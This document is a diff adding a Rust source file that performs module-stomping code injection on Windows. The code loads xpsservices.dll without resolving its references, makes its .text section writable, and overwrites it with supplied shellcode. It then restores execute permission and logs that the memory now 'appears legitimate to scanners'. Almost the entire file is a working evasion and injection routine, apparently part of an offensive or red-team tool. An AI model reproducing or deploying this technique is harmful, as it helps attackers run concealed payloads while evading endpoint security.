@@ -1,0 +1,117 @@
+use crate::injection::InjectionResult;
+use crate::log::LogSink;
+
+const DEFAULT_VICTIM_DLL: &str = "xpsservices.dll";
+
+pub fn victim_dll() -> &'static str {
+    DEFAULT_VICTIM_DLL
+}
+
+#[cfg(windows)]
+pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, String> {
+    use std::ffi::CString;
+    use windows::Win32::System::Memory::{
+        VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+    };
+
+    #[link(name = "kernel32")]
+    extern "system" {
+        fn LoadLibraryExA(
+            lpLibFileName: *const u8,
+            hFile: *mut std::ffi::c_void,
+            dwFlags: u32,
+        ) -> *mut std::ffi::c_void;
+    }
+
+    const DONT_RESOLVE_DLL_REFERENCES: u32 = 0x0000_0001;
+
+    let dll_name = CString::new(DEFAULT_VICTIM_DLL)
+        .map_err(|_| "invalid DLL name".to_string())?;
+
+    log.step(format!(
+        "[1/5] LoadLibraryExA(\"{DEFAULT_VICTIM_DLL}\", DONT_RESOLVE_DLL_REFERENCES)"
+    ));
+    let module = unsafe {
+        LoadLibraryExA(
+            dll_name.as_ptr() as *const u8,
+            std::ptr::null_mut(),
+            DONT_RESOLVE_DLL_REFERENCES,
+        )
+    };
+    if module.is_null() {
+        return Err(format!("LoadLibraryExA(\"{DEFAULT_VICTIM_DLL}\") failed"));
+    }
+    let base = module as *const u8;
+    log.detail(format!("  Module base: 0x{:016X}", base as usize));
+
+    log.step("[2/5] Parse PE → find .text section".to_string());
+    let text = crate::pe::find_text_section(base)?;
+    log.detail(format!(
+        "  .text at 0x{:016X}, size {} bytes",
+        text.base, text.size
+    ));
+
+    if shellcode.len() > text.size {
+        return Err(format!(
+            "shellcode ({} bytes) exceeds .text section ({} bytes)",
+            shellcode.len(),
+            text.size
+        ));
+    }
+
+    log.step(format!(
+        "[3/5] VirtualProtect(.text, PAGE_READWRITE) — {} bytes",
+        text.size
+    ));
+    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+    unsafe {
+        VirtualProtect(
+            text.base as *const std::ffi::c_void,
+            text.size,
+            PAGE_READWRITE,
+            &mut old_protect,
+        )
+    }
+    .map_err(|e| format!("VirtualProtect(RW) failed: {e}"))?;
+
+    log.step(format!(
+        "[4/5] Overwrite .text with {} bytes of shellcode",
+        shellcode.len()
+    ));
+    unsafe {
+        std::ptr::copy_nonoverlapping(
+            shellcode.as_ptr(),
+            text.base as *mut u8,
+            shellcode.len(),
+        );
+    }
+
+    log.step("[5/5] VirtualProtect(.text, PAGE_EXECUTE_READ)".to_string());
+    unsafe {
+        VirtualProtect(
+            text.base as *const std::ffi::c_void,
+            text.size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        )
+    }
+    .map_err(|e| format!("VirtualProtect(RX) failed: {e}"))?;
+
+    log.info(format!(
+        "  ✓ Module stomped: shellcode at 0x{:016X} inside {DEFAULT_VICTIM_DLL} .text",
+        text.base
+    ));
+    log.warning(
+        "  Memory is now backed by a signed DLL — appears legitimate to scanners".to_string(),
+    );
+
+    Ok(InjectionResult {
+        remote_base: text.base as u64,
+        size: shellcode.len(),
+    })
+}
+
+#[cfg(not(windows))]
+pub fn live_inject(_shellcode: &[u8], _log: &LogSink) -> Result<InjectionResult, String> {
+    Err("module stomping is only available on Windows".to_string())
+}
